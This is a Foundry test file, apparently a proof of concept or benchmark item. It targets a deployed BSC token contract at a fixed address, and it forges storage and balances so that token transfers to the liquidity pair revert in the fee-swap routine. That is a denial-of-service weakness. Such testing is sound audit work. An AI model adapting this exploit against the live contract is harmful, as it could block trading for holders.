pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IStandardToken {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function pair() external view returns (address);
    function router() external view returns (address);
    function paused() external view returns (bool);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328;
    address attacker = address(this);
    IStandardToken token;
    address pair;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IStandardToken(TARGET);
        pair = token.pair();

        // Label contracts for debugging
        vm.label(TARGET, "BGLG Token");
        vm.label(pair, "LP Pair");
        vm.label(0x10ED43C718714eb63d5aA57B78B54704E256024E, "PancakeRouter");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Calculate swapback threshold: totalSupply / 10000
        uint256 totalSupply = token.totalSupply();
        uint256 swapbackThreshold = totalSupply / 10000;

        // The fees struct is at storage slot 10 (after: name, symbol, decimals, totalSupply, allowance, balanceOf, holdersWallet, pair, router, WBNB)
        // fees.liquidity is the first field in the struct
        // Use vm.store to set fees.liquidity = 1 (enable liquidity fee)
        vm.store(TARGET, bytes32(uint256(10)), bytes32(uint256(1)));

        // Inject tokens into the CONTRACT balance to exceed swapback threshold
        deal(TARGET, TARGET, swapbackThreshold * 2);

        // Give contract a small amount of BNB to create imbalance
        // This ensures BNB exists but not enough for proportional liquidity
        deal(TARGET, 0.01 ether);

        // Give attacker tokens to make the transfer
        deal(TARGET, attacker, swapbackThreshold);

        // Approve router to spend attacker's tokens
        token.approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, swapbackThreshold);

        // This transfer to pair will trigger _sellAndDistributeAccumulatedTKNFee()
        // which will revert due to addLiquidityETH with imbalanced BNB/token ratio
        vm.expectRevert();
        token.transfer(pair, swapbackThreshold);

        // Verify the contract is NOT paused (oracle check)
        assertEq(token.paused(), false, "Contract should not be paused");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

